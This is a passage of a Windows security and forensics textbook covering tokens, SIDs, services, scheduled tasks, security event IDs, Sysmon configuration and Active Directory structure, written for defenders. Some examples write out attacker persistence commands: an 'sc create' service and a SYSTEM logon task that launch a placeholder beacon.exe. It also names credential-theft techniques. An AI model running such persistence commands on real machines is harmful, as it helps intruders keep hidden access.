+<p>When a user logs on, <strong>LSASS</strong> generates an <strong>access token</strong> representing the security context. Every thread uses the process's token by default; it can <strong>impersonate</strong> another token.</p>
+<p>The logical structure of a token (accessed via <code>GetTokenInformation</code>):</p>
+<table>
+<thead>
+<tr>
+<th>Component</th>
+<th>Meaning</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>User SID</td>
+<td>The primary identity of the token's owner</td>
+</tr>
+<tr>
+<td>Group SIDs</td>
+<td>List of groups + attributes (Enabled, UseForDenyOnly, ...)</td>
+</tr>
+<tr>
+<td>Privileges</td>
+<td>List of <code>LUID</code>s + attributes (for example <code>SeDebugPrivilege</code>, <code>SeBackupPrivilege</code>)</td>
+</tr>
+<tr>
+<td>Owner SID, Primary Group</td>
+<td>Defaults assigned to newly created objects</td>
+</tr>
+<tr>
+<td>Default DACL</td>
+<td>The default DACL for objects created by the token</td>
+</tr>
+<tr>
+<td>Token Type</td>
+<td>Primary (attached to a process) or Impersonation</td>
+</tr>
+<tr>
+<td>Impersonation Level</td>
+<td>Anonymous / Identification / Impersonation / Delegation</td>
+</tr>
+<tr>
+<td>Integrity Level</td>
+<td>Mandatory Integrity Control: Low/Medium/High/System</td>
+</tr>
+<tr>
+<td>Logon SID, Session ID</td>
+<td>The logon session</td>
+</tr>
+</tbody>
+</table>
+<h3 id="ch03-333-sid-security-identifier-binary-structure">3.3.3. SID — Security Identifier (binary structure)</h3>
+<p>A SID uniquely identifies a principal (user, group, machine, domain). String form: <code>S-1-5-21-&lt;domain&gt;-&lt;RID&gt;</code>.</p>
+<p>Binary structure:</p>
+<table>
+<thead>
+<tr>
+<th>Offset</th>
+<th>Size</th>
+<th>Field</th>
+<th>Meaning</th>
+<th>Example</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>0x00</td>
+<td>1 byte</td>
+<td>Revision</td>
+<td>Always = 1</td>
+<td><code>0x01</code></td>
+</tr>
+<tr>
+<td>0x01</td>
+<td>1 byte</td>
+<td>SubAuthorityCount</td>
+<td>Number of sub-authorities (max 15)</td>
+<td><code>0x05</code></td>
+</tr>
+<tr>
+<td>0x02</td>
+<td>6 bytes</td>
+<td>IdentifierAuthority</td>
+<td>Big-endian, for example 5 = NT Authority</td>
+<td><code>00 00 00 00 00 05</code></td>
+</tr>
+<tr>
+<td>0x08</td>
+<td>4×N bytes</td>
+<td>SubAuthority[]</td>
+<td>Each one 32-bit little-endian</td>
+<td><code>21 ...</code> then the RID</td>
+</tr>
+</tbody>
+</table>
+<p>The string <code>S-1-5-21-...</code> decodes as: <code>S</code>=SID, <code>1</code>=revision, <code>5</code>=IdentifierAuthority (NT), followed by the sub-authorities. The <strong>RID</strong> is the last sub-authority.</p>
+<p>Important fixed (well-known) RIDs:</p>
+<table>
+<thead>
+<tr>
+<th>RID / SID</th>
+<th>Name</th>
+<th>Meaning</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>500</td>
+<td>Administrator</td>
+<td>Built-in administrator account</td>
+</tr>
+<tr>
+<td>501</td>
+<td>Guest</td>
+<td>Guest</td>
+</tr>
+<tr>
+<td>512</td>
+<td>Domain Admins</td>
+<td>Domain admin group</td>
+</tr>
+<tr>
+<td>513</td>
+<td>Domain Users</td>
+<td>-</td>
+</tr>
+<tr>
+<td>519</td>
+<td>Enterprise Admins</td>
+<td>Forest-wide admin</td>
+</tr>
+<tr>
+<td><code>S-1-5-18</code></td>
+<td>LocalSystem</td>
+<td>The SYSTEM account</td>
+</tr>
+<tr>
+<td><code>S-1-5-32-544</code></td>
+<td>Builtin\Administrators</td>
+<td>-</td>
+</tr>
+<tr>
+<td><code>S-1-1-0</code></td>
+<td>Everyone</td>
+<td>-</td>
+</tr>
+</tbody>
+</table>
+<h3 id="ch03-334-real-world-example">3.3.4. Real-world example</h3>
+<pre><code class="language-powershell"># View the current process's token: SID, groups, privileges
+whoami /all
+
+# whoami /priv -&gt; lists privileges and their Enabled/Disabled state
+#   SeDebugPrivilege   Debug programs   Disabled
+</code></pre>
+<pre><code class="language-cmd">:: Convert SID &lt;-&gt; name (used when investigating audit logs)
+:: PsGetSid from Sysinternals
+PsGetSid.exe \\dc01 username
+:: or with PowerShell:
+</code></pre>
+<pre><code class="language-powershell">$sid = (New-Object System.Security.Principal.NTAccount(&quot;CORP&quot;,&quot;jdoe&quot;)).Translate([System.Security.Principal.SecurityIdentifier])
+$sid.Value      # S-1-5-21-...-1107
+</code></pre>
+<h3 id="ch03-335-security-notes">3.3.5. Security notes</h3>
+<ul>
+<li><code>SeDebugPrivilege</code> allows opening a PROCESS_ALL_ACCESS handle to any process, including LSASS → reading its memory to dump hashes. Monitor the enabling of this privilege.</li>
+<li><strong>Token impersonation/theft</strong>: malware holding <code>SeImpersonatePrivilege</code> (which service accounts have by default) exploits it to impersonate SYSTEM (the "Potato" family of attacks: JuicyPotato/RoguePotato/PrintSpoofer).</li>
+<li>A low <strong>Integrity Level</strong> (Low) is the browser sandbox; UAC uses the IL to split the token into Medium (a normal user) and High (an elevated admin).</li>
+</ul>
+<hr />
+<h2 id="ch03-34-services-and-scheduled-tasks">3.4. Services and Scheduled Tasks</h2>
+<h3 id="ch03-341-services">3.4.1. Services</h3>
+<p>The <strong>Service Control Manager (SCM)</strong> = <code>services.exe</code>, manages the service lifecycle. Configuration is stored at <code>HKLM\SYSTEM\CurrentControlSet\Services\&lt;Name&gt;</code>:</p>
+<table>
+<thead>
+<tr>
+<th>Value</th>
+<th>Type</th>
+<th>Meaning</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>ImagePath</code></td>
+<td>REG_EXPAND_SZ</td>
+<td>Path to the binary (or <code>svchost.exe -k &lt;group&gt;</code> for a service in a DLL)</td>
+</tr>
+<tr>
+<td><code>Start</code></td>
+<td>REG_DWORD</td>
+<td>0–4 (see table 3.2.3)</td>
+</tr>
+<tr>
+<td><code>Type</code></td>
+<td>REG_DWORD</td>
+<td>0x10=own process, 0x20=share process, 0x1=kernel driver</td>
+</tr>
+<tr>
+<td><code>ObjectName</code></td>
+<td>REG_SZ</td>
+<td>The account it runs as (<code>LocalSystem</code>, <code>NT AUTHORITY\NetworkService</code>, ...)</td>
+</tr>
+<tr>
+<td><code>ServiceDll</code></td>
+<td>REG_SZ (Parameters subkey)</td>
+<td>The DLL for an svchost-style service</td>
+</tr>
+</tbody>
+</table>
+<pre><code class="language-cmd">:: Create a new service (a common persistence/lateral movement technique)
+sc create EvilSvc binPath= &quot;C:\temp\beacon.exe&quot; start= auto
+sc qc Dnscache           :: query config
+sc query Dnscache        :: runtime state
+</code></pre>
+<blockquote>
+<p><strong>Why:</strong> <code>svchost.exe -k netsvcs</code> groups several lightweight services into one process to conserve resources. The security side effect: many services run under a shared token → a large surface, and it is hard to tell which service is faulty.</p>
+</blockquote>
+<p><strong>Note:</strong> Event ID <strong>7045</strong> (System log) = "A new service was installed" — a strong signal of lateral movement (PsExec creates the <code>PSEXESVC</code> service). An <strong>unquoted service path</strong> + write access to the parent directory = a classic privilege escalation.</p>
+<h3 id="ch03-342-scheduled-tasks">3.4.2. Scheduled Tasks</h3>
+<p>Stored at <code>C:\Windows\System32\Tasks\&lt;TaskName&gt;</code> (XML) + registered in the registry at <code>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache</code>.</p>
+<p>An example XML task that runs at logon:</p>
+<pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-16&quot;?&gt;
+&lt;Task version=&quot;1.2&quot; xmlns=&quot;http://schemas.microsoft.com/windows/2004/02/mit/task&quot;&gt;
+  &lt;Triggers&gt;
+    &lt;LogonTrigger&gt;&lt;Enabled&gt;true&lt;/Enabled&gt;&lt;/LogonTrigger&gt;
+  &lt;/Triggers&gt;
+  &lt;Principals&gt;
+    &lt;Principal id=&quot;Author&quot;&gt;
+      &lt;UserId&gt;S-1-5-18&lt;/UserId&gt;          &lt;!-- runs with SYSTEM privileges --&gt;
+      &lt;RunLevel&gt;HighestAvailable&lt;/RunLevel&gt;
+    &lt;/Principal&gt;
+  &lt;/Principals&gt;
+  &lt;Actions&gt;
+    &lt;Exec&gt;&lt;Command&gt;C:\temp\beacon.exe&lt;/Command&gt;&lt;/Exec&gt;
+  &lt;/Actions&gt;
+&lt;/Task&gt;
+</code></pre>
+<pre><code class="language-cmd">:: Create a task that runs every time the user logs on
+schtasks /create /tn &quot;Updater&quot; /tr &quot;C:\temp\beacon.exe&quot; /sc onlogon /ru SYSTEM
+</code></pre>
+<p><strong>Note:</strong> Event ID <strong>4698</strong> (task created), <strong>4702</strong> (updated) in the Security log; <strong>106/200/201</strong> in <code>Microsoft-Windows-TaskScheduler/Operational</code>. Running as <code>SYSTEM</code> + a logon trigger = persistence worth scrutinizing.</p>
+<hr />
+<h2 id="ch03-35-windows-event-log-the-core-security-event-ids">3.5. Windows Event Log — the core security Event IDs</h2>
+<h3 id="ch03-351-mechanism-the-evtx-format">3.5.1. Mechanism: the EVTX format</h3>
+<p>The modern event log (Vista+) stores <code>.evtx</code> files (<code>C:\Windows\System32\winevt\Logs\Security.evtx</code>) in a binary XML format. Structure:</p>
+<ul>
+<li><strong>File header (<code>ElfFile\0</code>, 4096 bytes)</strong>: signature <code>45 6C 66 46 69 6C 65 00</code>, containing the first/last chunk number and the next record ID.</li>
+<li><strong>Chunk (65536 bytes each)</strong>: signature <code>ElfChnk\0</code>, each chunk containing multiple <strong>event records</strong>.</li>
+<li><strong>Event record</strong>: signature <code>0x2A2A</code> (<code>**</code>), size, the <strong>EventRecordID</strong> (64-bit), a FILETIME timestamp, then the <strong>Binary XML</strong> payload (BinXML — token-based to compress repeated element/attribute names).</li>
+</ul>
+<pre><code>ElfFile\0 header (4096B)
+└── Chunk 0 (64KB)  [ElfChnk\0]
+     ├── Record (** | size | RecordID | FileTime | BinXML)
+     ├── Record ...
+└── Chunk 1 (64KB) ...
+</code></pre>
+<p>Each event is rendered into XML with a <code>&lt;System&gt;</code> section (Provider, EventID, TimeCreated, Computer, Security UserID) and an <code>&lt;EventData&gt;</code> section (the <code>&lt;Data Name="..."&gt;</code> entries).</p>
+<h3 id="ch03-352-event-4624-successful-logon">3.5.2. Event 4624 — Successful logon</h3>
+<p>This is the most important event. The main <code>&lt;EventData&gt;</code> fields:</p>
+<table>
+<thead>
+<tr>
+<th>Field</th>
+<th>Meaning</th>
+<th>Example</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>SubjectUserSid</code></td>
+<td>SID of the subject requesting the logon (usually SYSTEM)</td>
+<td>S-1-5-18</td>
+</tr>
+<tr>
+<td><code>TargetUserName</code></td>
+<td>The account logging on</td>
+<td>jdoe</td>
+</tr>
+<tr>
+<td><code>TargetDomainName</code></td>
+<td>Domain</td>
+<td>CORP</td>
+</tr>
+<tr>
+<td><code>TargetUserSid</code></td>
+<td>SID of the user logging on</td>
+<td>S-1-5-21-...-1107</td>
+</tr>
+<tr>
+<td><code>LogonType</code></td>
+<td>The logon type (see table)</td>
+<td>3</td>
+</tr>
+<tr>
+<td><code>LogonProcessName</code></td>
+<td>The authenticating process</td>
+<td>Kerberos / NtLmSsp / User32</td>
+</tr>
+<tr>
+<td><code>AuthenticationPackageName</code></td>
+<td>The auth package</td>
+<td>Kerberos / NTLM / Negotiate</td>
+</tr>
+<tr>
+<td><code>WorkstationName</code></td>
+<td>The source machine (NTLM)</td>
+<td>WS01</td>
+</tr>
+<tr>
+<td><code>IpAddress</code></td>
+<td>Source IP</td>
+<td>10.0.0.5</td>
+</tr>
+<tr>
+<td><code>LogonGuid</code></td>
+<td>GUID linking to 4769 (Kerberos)</td>
+<td>{…}</td>
+</tr>
+<tr>
+<td><code>ElevatedToken</code></td>
+<td>%%1842 (Yes) if the token is elevated</td>
+<td>-</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Logon Type</strong> — essential for understanding how access occurred:</p>
+<table>
+<thead>
+<tr>
+<th>Type</th>
+<th>Name</th>
+<th>Meaning</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>2</td>
+<td>Interactive</td>
+<td>Logon at the keyboard (or RDP via console)</td>
+</tr>
+<tr>
+<td>3</td>
+<td>Network</td>
+<td>Network logon: accessing a resource over the network (SMB, IIS) — credentials are <strong>not</strong> stored on the target machine</td>
+</tr>
+<tr>
+<td>4</td>
+<td>Batch</td>
+<td>Scheduled task</td>
+</tr>
+<tr>
+<td>5</td>
+<td>Service</td>
+<td>The SCM starting a service</td>
+</tr>
+<tr>
+<td>7</td>
+<td>Unlock</td>
+<td>Screen unlock</td>
+</tr>
+<tr>
+<td>8</td>
+<td>NetworkCleartext</td>
+<td>Password sent in cleartext (IIS Basic Auth)</td>
+</tr>
+<tr>
+<td>9</td>
+<td>NewCredentials</td>
+<td><code>runas /netonly</code> — new credentials for network connections (a sign of pass-the-hash with Mimikatz!)</td>
+</tr>
+<tr>
+<td>10</td>
+<td>RemoteInteractive</td>
+<td>RDP / Terminal Services (including RDP over NLA)</td>
+</tr>
+<tr>
+<td>11</td>
+<td>CachedInteractive</td>
+<td>Logon using cached credentials (offline)</td>
+</tr>
+</tbody>
+</table>
+<blockquote>
+<p><strong>Warning:</strong> Logon Type 9 is highly suspicious. Mimikatz <code>sekurlsa::pth</code> creates a logon session of type 9 + a LogonProcessName of <code>seclogo</code>. Hunt: 4624 type 9 + an anomalous process such as <code>mimikatz</code>/<code>rundll32</code>.</p>
+</blockquote>
+<h3 id="ch03-353-event-4625-failed-logon">3.5.3. Event 4625 — Failed logon</h3>
+<p>Adds the <code>Status</code>/<code>SubStatus</code> fields (NTSTATUS codes) indicating the reason:</p>
+<table>
+<thead>
+<tr>
+<th>SubStatus</th>
+<th>Meaning</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>0xC0000064</code></td>
+<td>User does not exist</td>
+</tr>
+<tr>
+<td><code>0xC000006A</code></td>
+<td>Wrong password</td>
+</tr>
+<tr>
+<td><code>0xC0000234</code></td>
+<td>Account is locked out</td>
+</tr>
+<tr>
+<td><code>0xC0000072</code></td>
+<td>Account is disabled</td>
+</tr>
+<tr>
+<td><code>0xC0000193</code></td>
+<td>Account has expired</td>
+</tr>
+<tr>
+<td><code>0xC000006F</code></td>
+<td>Logon outside of permitted hours</td>
+</tr>
+</tbody>
+</table>
+<blockquote>
+<p><strong>Note:</strong> hunt for brute-force/password spraying. Many 4625 <code>0xC000006A</code> events from one IP against many TargetUserNames is spraying; against one user repeatedly is brute force.</p>
+</blockquote>
+<h3 id="ch03-354-other-security-event-ids">3.5.4. Other Security Event IDs</h3>
+<table>
+<thead>
+<tr>
+<th>Event ID</th>
+<th>Meaning</th>
+<th>Important fields/notes</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>4634</strong></td>
+<td>Logoff</td>
+<td><code>LogonType</code>, <code>TargetLogonId</code> (matches 4624)</td>
+</tr>
+<tr>
+<td><strong>4647</strong></td>
+<td>User-initiated logoff</td>
+<td>-</td>
+</tr>
+<tr>
+<td><strong>4672</strong></td>
+<td>Special privileges assigned to new logon</td>
+<td>Generated with each admin logon; <code>PrivilegeList</code> contains SeDebug/SeBackup... → used to detect admin logons</td>
+</tr>
+<tr>
+<td><strong>4688</strong></td>
+<td>A new process has been created</td>
+<td><code>NewProcessName</code>, <code>ProcessId</code>, <code>CommandLine</code> (requires enabling the "Include command line" audit), <code>ParentProcessName</code>, <code>TokenElevationType</code></td>
+</tr>
+<tr>
+<td><strong>4720</strong></td>
+<td>A user account was created</td>
+<td><code>TargetUserName</code>, <code>SubjectUserName</code> (who created it)</td>
+</tr>
+<tr>
+<td><strong>4722/4725/4726</strong></td>
+<td>Account enabled / disabled / deleted</td>
+<td>-</td>
+</tr>
+<tr>
+<td><strong>4728/4732/4756</strong></td>
+<td>Member added to a global/local/universal group</td>
+<td>Track additions to Domain Admins</td>
+</tr>
+<tr>
+<td><strong>4768</strong></td>
+<td>Kerberos TGT requested (AS-REQ)</td>
+<td><code>TicketEncryptionType</code>, <code>PreAuthType</code>, client IP</td>
+</tr>
+<tr>
+<td><strong>4769</strong></td>
+<td>Kerberos service ticket requested (TGS-REQ)</td>
+<td><code>ServiceName</code>, <code>TicketEncryptionType</code> (0x17=RC4 → Kerberoasting!)</td>
+</tr>
+<tr>
+<td><strong>4771</strong></td>
+<td>Kerberos pre-authentication failed</td>
+<td><code>FailureCode</code> (0x18 = wrong password)</td>
+</tr>
+<tr>
+<td><strong>4776</strong></td>
+<td>NTLM credential validation (DC)</td>
+<td><code>Status</code></td>
+</tr>
+<tr>
+<td><strong>1102</strong></td>
+<td>The audit log was cleared</td>
+<td>The <code>SubjectUserName</code>/<code>SubjectUserSid</code> fields — who cleared the log</td>
+</tr>
+<tr>
+<td><strong>4719</strong></td>
+<td>System audit policy was changed</td>
+<td>An attacker disabling auditing</td>
+</tr>
+</tbody>
+</table>
+<h3 id="ch03-355-event-4688-command-line-detail">3.5.5. Event 4688 — command line detail</h3>
+<p>By default, 4688 does <strong>not</strong> contain the command line. It must be enabled:</p>
+<pre><code class="language-cmd">:: Enable command-line capture in 4688 (GPO: Administrative Templates &gt;
+::   System &gt; Audit Process Creation)
+reg add &quot;HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\Audit&quot; ^
+  /v ProcessCreationIncludeCmdLine_Enabled /t REG_DWORD /d 1 /f
+
+:: Enable the &quot;Process Creation&quot; audit subcategory
+auditpol /set /subcategory:&quot;Process Creation&quot; /success:enable /failure:enable
+</code></pre>
+<p>After enabling, a sample 4688 event (abbreviated):</p>
+<pre><code class="language-xml">&lt;EventData&gt;
+  &lt;Data Name=&quot;NewProcessName&quot;&gt;C:\Windows\System32\cmd.exe&lt;/Data&gt;
+  &lt;Data Name=&quot;ProcessId&quot;&gt;0x1a2c&lt;/Data&gt;
+  &lt;Data Name=&quot;CommandLine&quot;&gt;cmd.exe /c whoami /all&lt;/Data&gt;
+  &lt;Data Name=&quot;ParentProcessName&quot;&gt;C:\Program Files\Microsoft Office\WINWORD.EXE&lt;/Data&gt;
+  &lt;Data Name=&quot;TokenElevationType&quot;&gt;%%1936&lt;/Data&gt;   &lt;!-- Type 1 = full token --&gt;
+  &lt;Data Name=&quot;SubjectUserName&quot;&gt;jdoe&lt;/Data&gt;
+&lt;/EventData&gt;
+</code></pre>
+<p><code>TokenElevationType</code>: <code>%%1936</code> (Type 1, full token, no UAC split), <code>%%1937</code> (Type 2, elevated via UAC), <code>%%1938</code> (Type 3, limited).</p>
+<h3 id="ch03-356-event-1102-audit-log-cleared">3.5.6. Event 1102 — Audit log cleared</h3>
+<pre><code class="language-xml">&lt;UserData&gt;
+  &lt;LogFileCleared&gt;
+    &lt;SubjectUserSid&gt;S-1-5-21-...-1107&lt;/SubjectUserSid&gt;
+    &lt;SubjectUserName&gt;attacker&lt;/SubjectUserName&gt;
+    &lt;SubjectDomainName&gt;CORP&lt;/SubjectDomainName&gt;
+  &lt;/LogFileCleared&gt;
+&lt;/UserData&gt;
+</code></pre>
+<blockquote>
+<p><strong>Note:</strong> 1102 (Security) and 104 (System, a different log being cleared) are anti-forensic indicators. Forwarding logs in real time (WEF/Sysmon→SIEM) before the attacker clears them is the countermeasure.</p>
+</blockquote>
+<hr />
+<h2 id="ch03-36-sysmon-system-monitor">3.6. Sysmon — System Monitor</h2>
+<h3 id="ch03-361-what-it-is">3.6.1. What it is</h3>
+<p>Sysmon (Sysinternals) is a driver + service that logs detailed telemetry into <code>Microsoft-Windows-Sysmon/Operational</code>. It goes far beyond native auditing because it provides <strong>file hashes, process GUIDs, network→process mapping, full command lines, and a ProcessGUID that chains events together</strong>.</p>
+<h3 id="ch03-362-the-key-sysmon-event-ids">3.6.2. The key Sysmon Event IDs</h3>
+<table>
+<thead>
+<tr>
+<th>Event ID</th>
+<th>Event</th>
+<th>Notable fields</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>1</strong></td>
+<td>Process creation</td>
+<td><code>Image</code>, <code>CommandLine</code>, <code>Hashes</code>, <code>ParentImage</code>, <code>ParentCommandLine</code>, <code>ProcessGuid</code>, <code>User</code>, <code>IntegrityLevel</code>, <code>OriginalFileName</code></td>
+</tr>
+<tr>
+<td><strong>3</strong></td>
+<td>Network connection</td>
+<td><code>Image</code>, <code>Protocol</code>, <code>SourceIp/Port</code>, <code>DestinationIp/Port</code>, <code>DestinationHostname</code></td>
+</tr>
+<tr>
+<td><strong>5</strong></td>
+<td>Process terminated</td>
+<td><code>ProcessGuid</code>, <code>Image</code></td>
+</tr>
+<tr>
+<td><strong>7</strong></td>
+<td>Image (DLL) loaded</td>
+<td><code>ImageLoaded</code>, <code>Signed</code>, <code>Signature</code>, <code>SignatureStatus</code>, <code>Hashes</code> — detects DLL hijacking/unsigned DLLs</td>
+</tr>
+<tr>
+<td><strong>8</strong></td>
+<td>CreateRemoteThread</td>
+<td><code>SourceImage</code>, <code>TargetImage</code>, <code>StartAddress</code> — detects process injection</td>
+</tr>
+<tr>
+<td><strong>10</strong></td>
+<td>ProcessAccess</td>
+<td><code>SourceImage</code>, <code>TargetImage</code>, <code>GrantedAccess</code> — detects reading LSASS (0x1010/0x1410)</td>
+</tr>
+<tr>
+<td><strong>11</strong></td>
+<td>File created</td>
+<td><code>TargetFilename</code>, <code>CreationUtcTime</code> — payload drop</td>
+</tr>
+<tr>
+<td><strong>12/13/14</strong></td>
+<td>Registry key/value/rename</td>
+<td><code>TargetObject</code>, <code>Details</code> — ASEP persistence</td>
+</tr>
+<tr>
+<td><strong>22</strong></td>
+<td>DNS query</td>
+<td><code>QueryName</code>, <code>QueryResults</code>, <code>Image</code> — detects C2/DGA</td>
+</tr>
+</tbody>
+</table>
+<h3 id="ch03-363-a-real-world-xml-configuration">3.6.3. A real-world XML configuration</h3>
+<p>Sysmon uses an XML config file with schema versioning. An example of a minimal but effective config:</p>
+<pre><code class="language-xml">&lt;Sysmon schemaversion=&quot;4.90&quot;&gt;
+  &lt;HashAlgorithms&gt;SHA256,IMPHASH&lt;/HashAlgorithms&gt;
+  &lt;EventFiltering&gt;
+
+    &lt;!-- EID 1: log every process, but filter out some noise --&gt;
+    &lt;RuleGroup name=&quot;ProcCreate&quot; groupRelation=&quot;or&quot;&gt;
+      &lt;ProcessCreate onmatch=&quot;exclude&quot;&gt;
+        &lt;Image condition=&quot;is&quot;&gt;C:\Windows\System32\SearchIndexer.exe&lt;/Image&gt;
+      &lt;/ProcessCreate&gt;
+    &lt;/RuleGroup&gt;
+
+    &lt;!-- EID 10: alert on LSASS access --&gt;
+    &lt;RuleGroup name=&quot;LsassAccess&quot; groupRelation=&quot;or&quot;&gt;
+      &lt;ProcessAccess onmatch=&quot;include&quot;&gt;
+        &lt;TargetImage condition=&quot;image&quot;&gt;lsass.exe&lt;/TargetImage&gt;
+      &lt;/ProcessAccess&gt;
+    &lt;/RuleGroup&gt;
+
+    &lt;!-- EID 22: log every DNS query except trusted Microsoft domains --&gt;
+    &lt;RuleGroup name=&quot;Dns&quot; groupRelation=&quot;or&quot;&gt;
+      &lt;DnsQuery onmatch=&quot;exclude&quot;&gt;
+        &lt;QueryName condition=&quot;end with&quot;&gt;.microsoft.com&lt;/QueryName&gt;
+      &lt;/DnsQuery&gt;
+    &lt;/RuleGroup&gt;
+
+    &lt;!-- EID 13: registry persistence --&gt;
+    &lt;RuleGroup name=&quot;RegPersist&quot; groupRelation=&quot;or&quot;&gt;
+      &lt;RegistryEvent onmatch=&quot;include&quot;&gt;
+        &lt;TargetObject condition=&quot;contains&quot;&gt;\CurrentVersion\Run&lt;/TargetObject&gt;
+      &lt;/RegistryEvent&gt;
+    &lt;/RuleGroup&gt;
+
+  &lt;/EventFiltering&gt;
+&lt;/Sysmon&gt;
+</code></pre>
+<p>Parameter explanation:
+- <code>onmatch="include"</code>: only logs events that match the rule (a whitelist). <code>onmatch="exclude"</code>: logs every event except those that match (a blacklist).
+- <code>groupRelation="or"</code>: only one rule in the group needs to match.
+- <code>condition</code>: <code>is</code>, <code>contains</code>, <code>begin with</code>, <code>end with</code>, <code>image</code> (matches the file name ignoring path), <code>regex</code>, ...</p>
+<pre><code class="language-cmd">:: Install Sysmon with a config
+Sysmon64.exe -accepteula -i sysmonconfig.xml
+
+:: Update the config without reinstalling
+Sysmon64.exe -c sysmonconfig.xml
+</code></pre>
+<p>A sample Event ID 1 (abbreviated):</p>
+<pre><code class="language-xml">&lt;EventData&gt;
+  &lt;Data Name=&quot;UtcTime&quot;&gt;2026-06-19 03:21:55.123&lt;/Data&gt;
+  &lt;Data Name=&quot;ProcessGuid&quot;&gt;{a1b2...}&lt;/Data&gt;
+  &lt;Data Name=&quot;ProcessId&quot;&gt;6948&lt;/Data&gt;
+  &lt;Data Name=&quot;Image&quot;&gt;C:\Windows\System32\cmd.exe&lt;/Data&gt;
+  &lt;Data Name=&quot;CommandLine&quot;&gt;cmd /c &quot;powershell -enc SQBFAFgA...&quot;&lt;/Data&gt;
+  &lt;Data Name=&quot;Hashes&quot;&gt;SHA256=...,IMPHASH=...&lt;/Data&gt;
+  &lt;Data Name=&quot;ParentImage&quot;&gt;C:\Program Files\...\WINWORD.EXE&lt;/Data&gt;
+  &lt;Data Name=&quot;ParentCommandLine&quot;&gt;&quot;WINWORD.EXE&quot; /n invoice.docx&lt;/Data&gt;
+  &lt;Data Name=&quot;User&quot;&gt;CORP\jdoe&lt;/Data&gt;
+  &lt;Data Name=&quot;IntegrityLevel&quot;&gt;Medium&lt;/Data&gt;
+&lt;/EventData&gt;
+</code></pre>
+<blockquote>
+<p><strong>Note:</strong> the ProcessGuid is durable (not reused like a PID) → it chains together the entire event sequence of one process. Events 8/10 with a GrantedAccess of <code>0x1410</code>/<code>0x1010</code> targeting <code>lsass.exe</code> are a strong credential-dumping indicator.</p>
+</blockquote>
+<hr />
+<h2 id="ch03-37-active-directory-logical-and-physical-structure">3.7. Active Directory — Logical and physical structure</h2>
+<h3 id="ch03-371-domain-tree-forest-ou">3.7.1. Domain, Tree, Forest, OU</h3>
+<table>
+<thead>
+<tr>
+<th>Concept</th>
+<th>Definition</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Domain</strong></td>
+<td>An administrative boundary + a replicated copy of the database (NTDS.dit). DCs sync the same namespace, for example <code>corp.example.com</code></td>
+</tr>
+<tr>
+<td><strong>Tree</strong></td>
+<td>A set of domains sharing a contiguous namespace (<code>corp.example.com</code> ↔ <code>sales.corp.example.com</code>)</td>
+</tr>
+<tr>
+<td><strong>Forest</strong></td>
+<td>The highest-level trust boundary. Shares a common schema + Global Catalog + Enterprise Admins. <strong>The forest is the true trust boundary</strong></td>
+</tr>
+<tr>
+<td><strong>OU (Organizational Unit)</strong></td>
+<td>A container for applying GPOs and delegating administration (delegation)</td>
+</tr>
+<tr>
+<td><strong>Site</strong></td>
+<td>A physical structure by IP subnet — controls replication and selects the nearest DC</td>
+</tr>
+</tbody>
+</table>
+<p>The logical hierarchy of AD: the <strong>Forest</strong> encompasses everything and is the highest-level trust boundary; within it are one or more <strong>Trees</strong> (sharing a contiguous namespace), each Tree containing <strong>Domains</strong>; within a Domain, branches form <strong>OUs</strong> for applying GPOs and delegation, holding the leaf objects (user/computer/group).</p>
+<pre><code>FOREST  (highest-level trust boundary — schema + Global Catalog + Enterprise Admins)
+└── TREE: example.com
+    ├── DOMAIN (root): corp.example.com          [NTDS.dit, the DCs]
+    │   ├── OU=Servers
+    │   │   └── (computer objects)
+    │   ├── OU=Workstations
+    │   ├── OU=Users
+    │   │   ├── CN=jdoe        (user)
+    │   │   └── CN=svc_sql     (service account, has an SPN)
+    │   └── OU=Groups
+    │       └── CN=Domain Admins
+    └── DOMAIN (child): sales.corp.example.com    [parent-child trust, two-way, transitive]
+        └── OU=...
+</code></pre>
+<p>Note on trust boundaries: an OU is <strong>not</strong> a trust boundary (it is only a unit for applying policy/delegation); a Domain is an administrative boundary, but <strong>the Forest is the true trust boundary</strong> — capturing one domain in a forest can bridge to another domain via a trust if SID filtering is not enabled.</p>
+<h3 id="ch03-372-ntdsdit-and-partitions">3.7.2. NTDS.dit and partitions</h3>
+<p>The AD database lives in <code>C:\Windows\NTDS\ntds.dit</code> (the ESE/JET Blue format). It is divided into <strong>naming contexts (partitions)</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>Partition</th>
+<th>DN</th>
+<th>Contents</th>
+<th>Replication scope</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Schema</td>
+<td><code>CN=Schema,CN=Configuration,DC=...</code></td>
+<td>Class/attribute definitions</td>
+<td>Forest-wide</td>
+</tr>
+<tr>
+<td>Configuration</td>
+<td><code>CN=Configuration,DC=...</code></td>
+<td>Sites, subnets, services</td>
+<td>Forest-wide</td>
+</tr>
+<tr>
+<td>Domain</td>
+<td><code>DC=corp,DC=example,DC=com</code></td>
+<td>Users, groups, computers</td>
+<td>One domain</td>
+</tr>
+<tr>
+<td>Application (DNS)</td>
+<td><code>DC=DomainDnsZones,...</code></td>
+<td>AD-integrated DNS</td>
+<td>Depends on configuration</td>
+</tr>
+</tbody>
+</table>
+<h3 id="ch03-373-schema">3.7.3. Schema</h3>
+<p>The schema defines <strong>classSchema</strong> (object classes) and <strong>attributeSchema</strong> (attributes). Each attribute has:
+- <code>attributeID</code>: an OID (for example <code>1.2.840.113556.1.4.221</code> for sAMAccountName).
+- <code>attributeSyntax</code> + <code>oMSyntax</code>: the data type.
+- <code>isSingleValued</code>, <code>searchFlags</code> (bit 1 = indexed).</p>
+<blockquote>
+<p><strong>Why:</strong> the schema replicates forest-wide and is hard to change because a schema change is permanent (it can only be deactivated, never truly deleted) and affects every DC — which is why the forest is the schema boundary.</p>
+</blockquote>
